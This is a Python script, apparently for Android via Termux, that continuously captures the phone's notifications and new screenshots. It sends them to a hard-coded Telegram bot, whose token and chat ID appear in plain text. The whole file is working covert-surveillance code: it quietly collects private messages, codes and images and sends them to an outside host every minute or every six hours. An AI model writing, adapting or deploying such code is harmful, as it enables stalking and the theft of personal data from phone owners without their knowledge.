import os
import time
import requests
import subprocess
from datetime import datetime

# Telegram Bot API settings
TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendMessage"
CHAT_ID = "5928551879"

# Directory where screenshots are saved
SCREENSHOT_DIR = "/storage/emulated/0/Pictures/Screenshots/"

# File to store captured notifications
NOTIFICATIONS_FILE = "notifications.txt"

# Cache to track sent screenshots
sent_screenshots = set()

def send_telegram_message(message):
    """Send a message to the Telegram bot"""
    try:
        data = {'chat_id': CHAT_ID, 'text': message}
        response = requests.post(TELEGRAM_API_URL, data=data, timeout=10)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error sending message to Telegram: {e}")

def send_telegram_photo(photo_path):
    """Send a photo to the Telegram bot"""
    try:
        with open(photo_path, 'rb') as photo:
            files = {'document': photo}
            data = {'chat_id': CHAT_ID}
            response = requests.post(
                f"{TELEGRAM_API_URL.replace('sendMessage', 'sendDocument')}",
                data=data, files=files, timeout=30
            )
            response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error sending photo to Telegram: {e}")

def get_new_screenshots():
    """Get only new screenshot files from the directory"""
    global sent_screenshots
    new_screenshots = []
    for root, _, files in os.walk(SCREENSHOT_DIR):
        for file in files:
            if file.lower().endswith(('.png', '.jpg', '.jpeg')):
                file_path = os.path.join(root, file)
                if file_path not in sent_screenshots:
                    sent_screenshots.add(file_path)
                    new_screenshots.append(file_path)
    return new_screenshots

def capture_notifications():
    """Capture notifications using termux-notification-list and save them to a file"""
    try:
        result = subprocess.check_output(['termux-notification-list'], stderr=subprocess.STDOUT, timeout=10)
        notifications = result.decode('utf-8').splitlines()

        with open(NOTIFICATIONS_FILE, 'a') as file:
            for notification in notifications:
                if "App:" in notification and "Title:" in notification and "Text:" in notification:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    file.write(f"[{timestamp}] {notification}\n")
    except subprocess.TimeoutExpired:
        print("Timeout capturing notifications.")
    except subprocess.CalledProcessError as e:
        print(f"Error capturing notifications: {e.output.decode()}")

def send_notifications_file():
    """Send the saved notifications file to Telegram every 6 hours"""
    if os.path.exists(NOTIFICATIONS_FILE):
        try:
            with open(NOTIFICATIONS_FILE, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': CHAT_ID, 'caption': 'Collected Notifications'}
                response = requests.post(
                    f"{TELEGRAM_API_URL.replace('sendMessage', 'sendDocument')}",
                    data=data, files=files, timeout=30
                )
                response.raise_for_status()
                print("Notifications file sent to Telegram.")
        except requests.RequestException as e:
            print(f"Error sending notifications file to Telegram: {e}")
        finally:
            # Clear the file after sending
            open(NOTIFICATIONS_FILE, 'w').close()

def main():
    last_sent_time = time.time()
    send_interval = 6 * 3600  # 6 hours in seconds

    while True:
        try:
            # Continuously capture notifications
            capture_notifications()

            # Check if it's time to send the notifications file
            current_time = time.time()
            if current_time - last_sent_time >= send_interval:
                send_notifications_file()
                last_sent_time = current_time

            # Send new screenshots
            screenshots = get_new_screenshots()
            for screenshot in screenshots:
                send_telegram_photo(screenshot)
                print(f"Screenshot sent: {screenshot}")

            # Sleep briefly to reduce CPU usage
            time.sleep(60)
        except KeyboardInterrupt:
            print("Script interrupted.")
            break

if __name__ == "__main__":
    main()
